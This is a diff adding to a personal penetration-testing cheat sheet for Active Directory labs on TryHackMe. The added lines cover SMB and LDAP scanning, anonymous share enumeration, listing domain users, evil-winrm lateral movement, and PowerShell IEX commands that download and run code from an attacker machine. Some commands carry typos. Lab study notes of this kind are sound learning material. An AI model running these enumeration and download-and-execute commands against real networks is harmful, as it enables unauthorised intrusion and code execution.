@@ -191,6 +191,38 @@ If we have the AD credentials in the format of :, we can use Runas, a legitimate
 
             cmd.exe - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since you can then use that to launch whatever you want, with the credentials injected.
     
+####################
+AD Enumeration Scan
+####################
+    Scan Network:
+        nmap -Pn --script smb-vuln* -p139,445 10.200.24.101
+        nmap -Pn -sV --top-ports 50 --open <ip> -vv
+        nmap -n -sV --script"ldap* and not brute" -p 389 10.200.24.101
+
+    List Guess access on SMB:
+        smbmap -u ""-p"" -P 445 -H 10.200.24.101
+        smbmap -H <ip> -u anonymous -R #Recursive search
+
+        smbclient -U '%' -L //10.200.24.101
+        smbclient -U 'guest%' -L //10.200.24.101
+
+    FInd DC IP:
+        nslookup -type=SRV _ldap._tcp.dc.msdcs.za.tryhackme.com
+
+    
+    
+    Enumerateldap: ldapsearch -x -h 10.200.24.101 -s base:
+        ldapServiceName: za.tryhackme.com:thmdc$@ZA.TRYHACKME.COM
+        dnsHostName: THMDC.za.tryhackme.com
+
+    Find User list: net rpc group members 'Domain Users' -W 'ZA.TRYHACKME.COM' -I '10.200.24.101' -U '%'
+
+
+####################
+AD Enumeration Lateral Movement
+####################
+    evil-winrm -i <ip> -u <svcUser> -p <password>
+    evil-winrm -u <> -p <> -i <>
 
 ####################
 Check DNS for SYSVOL in AD Enumeration
@@ -303,3 +335,20 @@ Upload payload from Victim machine: -> Active_Directory/AD_Step4/Exploiting_AD_U
 
     or in case of python3 web server download from:
         cerutlis -urlcache -f http:\\<ATTCK IP MACHINE>:<PORT>/<PayloadName>  <PayloadName>
+
+####################
+Powershell Download
+##################
+
+to download an exe from powershell on a web server in our Kali machine
+
+    powershell -c 'IEX(New_Object Net.WebClient).DownloadString("http://<KaliIP/exeFile>")'
+    powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('')"
+
+
+
+
+####################
+Privilege Escalation Windows
+##################
+    https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
